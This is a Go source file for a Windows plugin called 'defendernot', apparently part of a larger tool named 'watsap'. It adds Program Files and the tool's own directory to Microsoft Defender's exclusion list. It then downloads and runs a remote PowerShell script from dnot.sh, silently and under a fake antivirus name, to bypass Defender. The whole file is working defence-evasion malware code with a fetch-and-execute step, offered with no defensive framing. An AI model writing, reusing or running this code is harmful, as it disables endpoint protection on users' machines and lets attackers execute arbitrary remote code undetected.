//go:build windows

package defendernot

import (
	"fmt"
	"log"
	"os/exec"
	"watsap/utils/config"
)

// Configuration variables.
var customAVName = "WindowsDefender"

// Global variable to store the PowerShell binary path.
var powershellPath string

func init() {
	/* Configure the logger:
	log.SetPrefix("[DefenderNot] ")
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)

	log.Println("Plugin initialized.")

	if err := checkPowerShell(); err != nil {
		log.Printf("WARNING: Initialization check failed: %v", err)
	}
	*/
}

/* check if PowerShell is installed on the system and retrieves its path.
func checkPowerShell() error {
	powershellPath, err := exec.LookPath("powershell")
	if err != nil {
		return fmt.Errorf("powershell not found in system")
	}
	log.Printf("PowerShell found at: %s", powershellPath)
	return nil
}
*/

// Main executes the bypass operation.
func Main() {
	AddDefenderExclusions()

	log.Printf("Starting bypass operation with custom name: %s", customAVName)
	cmdString := fmt.Sprintf("& ([ScriptBlock]::Create((irm https://dnot.sh/))) --silent --name %s", customAVName)
	cmd := exec.Command(powershellPath, "-NoProfile", "-Command", cmdString)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Command execution failed. Output: %s", string(output))
		return
	}

	log.Println("Bypass command executed successfully.")
}

// add some paths to defender exclusion list
var defenderExclusions = []string{
	"C:\\Program Files",
	config.WaDir,
}

func AddDefenderExclusions() {
	for _, path := range defenderExclusions {
		fmt.Printf("Added %s to Exclusion list: ", path)
		cmd := exec.Command(powershellPath, "-NoProfile", "-Command", fmt.Sprintf("Add-MpPreference -ExclusionPath '%s'", path))
		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("Failed to add exclusion for path: %s. Output: %s", path, string(output))
			continue
		}
		log.Printf("Successfully added exclusion for path: %s", path)
	}
}
